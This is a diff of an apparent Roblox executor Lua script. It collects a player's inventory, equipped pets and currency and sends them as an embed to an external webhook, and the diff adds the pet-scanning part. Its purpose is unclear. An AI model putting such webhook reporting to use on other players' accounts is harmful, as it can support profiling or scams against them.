@@ -19,7 +19,7 @@ local function formatNumberWithCommas(n)
     return s
 end
 
--- Collect inventory
+-- Gather inventory
 local allItems = {}
 local function gatherItems(container)
     for _, tool in ipairs(container:GetChildren()) do
@@ -32,43 +32,31 @@ end
 gatherItems(player.Backpack)
 gatherItems(player.Character or player.CharacterAdded:Wait())
 
--- Categorize inventory
+-- Format item counts
 local function formatItems(items)
     local result = {}
-
     for _, name in ipairs(items) do
         local count = "1"
         local cleanName = name
-
-        -- Try to match [xN] or [XN] at end (case-insensitive)
         local bracketed = name:match("%[([xX])(%d+)%]%s*$")
         if bracketed then
             count = name:match("%[.[%d]+%]"):match("%d+")
             cleanName = name:gsub("%s*%[[xX]%d+%]%s*$", "")
         else
-            -- Try to match xN or XN at end (e.g., "Egg x3", "Egg X3", "Eggx3", "EggX3")
             local xCount = name:match("[xX](%d+)%s*$")
             if xCount then
                 count = xCount
                 cleanName = name:gsub("%s*[xX]%d+%s*$", "")
             end
         end
-
-        -- Pad count to 2 digits
         count = string.format("%02d", tonumber(count) or 1)
-
-        -- Trim whitespace
         cleanName = cleanName:gsub("^%s*(.-)%s*$", "%1")
         table.insert(result, string.format("[x%s] %s", count, cleanName))
     end
-
     return result
 end
 
-
-
-
-
+-- Keyword filter
 local function filterItems(keywordList)
     local filtered = {}
     for _, item in ipairs(allItems) do
@@ -82,13 +70,45 @@ local function filterItems(keywordList)
     return formatItems(filtered)
 end
 
-local petsEquipped = {} -- We'll populate this later if needed
+local petsEquipped = {} -- To be populated below
 local pets = filterItems({ "age" })
 local eggs = filterItems({ "egg" })
 local seeds = filterItems({ "seed" })
 local gears = filterItems({ "sprinkler", "staff", "rod" })
 
--- Construct message
+-- Scan ActivePetUI for equipped pets
+debug("🔍 Scanning ActivePetUI for equipped pets...")
+local success, err = pcall(function()
+    local scrollingFrame = player:WaitForChild("PlayerGui")
+        :WaitForChild("ActivePetUI")
+        :WaitForChild("Frame")
+        :WaitForChild("Main")
+        :WaitForChild("ScrollingFrame")
+
+    for _, petFrame in pairs(scrollingFrame:GetChildren()) do
+        if petFrame:IsA("Frame") and petFrame.Name ~= "PetTemplate" then
+            local nameLabel = petFrame:FindFirstChild("PET_NAME")
+            local typeLabel = petFrame:FindFirstChild("PET_TYPE")
+            local ageLabel = petFrame:FindFirstChild("PET_AGE")
+
+            if nameLabel and typeLabel and ageLabel then
+                local name = nameLabel.Text
+                local petType = typeLabel.Text
+                local age = ageLabel.Text:gsub("Age: ", "")
+                table.insert(petsEquipped, string.format("%s (%s) — Age: %s", name, petType, age))
+                debug("🟢 Found pet: " .. name)
+            else
+                debug("⚠️ Skipped pet UI frame: " .. petFrame.Name)
+            end
+        end
+    end
+end)
+
+if not success then
+    debug("❌ Failed to scan equipped pets: " .. tostring(err))
+end
+
+-- Webhook payload
 local function codeBlock(list)
     if #list == 0 then return "```\nNone\n```" end
     return "```\n   " .. table.concat(list, "\n‎ ‎ ‎ ‎") .. "\n```"
@@ -101,8 +121,8 @@ local message = {
     embeds = { {
         title = "**" .. player.Name .. "**",
         description = "_ _\n> **🪙 Sheckles  **: " ..
-    (player.leaderstats and player.leaderstats:FindFirstChild("Sheckles") and formatNumberWithCommas(player.leaderstats.Sheckles.Value) or "Unknown") ..
-    "\n_ _\n_ _\n**> 🎒 | Inventory**\n_ _\n_ _",
+            (player.leaderstats and player.leaderstats:FindFirstChild("Sheckles") and formatNumberWithCommas(player.leaderstats.Sheckles.Value) or "Unknown") ..
+            "\n_ _\n_ _\n**> 🎒 | Inventory**\n_ _\n_ _",
         color = 2750290,
         fields = {
             {
@@ -147,5 +167,3 @@ if req then
 else
     debug("❌ HTTP requests not supported.")
 end
-
-
